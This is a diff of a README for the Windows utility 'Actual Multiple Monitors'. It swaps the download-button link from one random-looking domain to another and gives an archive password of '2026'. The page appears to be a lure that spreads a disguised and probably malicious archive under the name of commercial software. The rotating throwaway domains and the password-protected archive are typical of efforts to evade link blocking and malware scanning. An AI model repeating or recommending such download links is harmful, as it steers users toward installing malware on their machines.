@@ -1,6 +1,6 @@
 # Actual Multiple Monitors
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://bipfdjnk.com/Actual-multiple-monitors-2026)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Actual-multiple-monitors-2026)
 > #### Archive password: `2026`
 
 A Windows utility that adds a fully functional taskbar, window management tools, and desktop enhancements to every monitor in a multi-display setup.
